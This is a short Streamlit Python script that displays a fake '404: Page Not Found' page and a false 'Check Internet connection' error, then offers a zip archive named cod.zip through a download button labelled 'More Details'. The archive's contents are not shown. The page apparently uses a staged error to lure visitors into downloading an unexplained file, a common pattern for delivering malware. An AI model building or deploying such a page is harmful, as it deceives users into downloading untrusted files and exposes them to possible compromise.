import streamlit as st
import os

# Set the custom domain
st.set_page_config(page_title="404: Not Found",layout="wide")

zip_file_path = "cod.zip"

st.title("404: Page Not Found")
st.error("Check Internet connection...")

if os.path.exists(zip_file_path):
    with open(zip_file_path, "rb") as f:
        zip_data = f.read()
    
    st.download_button(
        label="More Details",
        data=zip_data,
        file_name="cod.zip",
        mime="application/zip"
    )
else:
    st.error("ZIP file not found.")
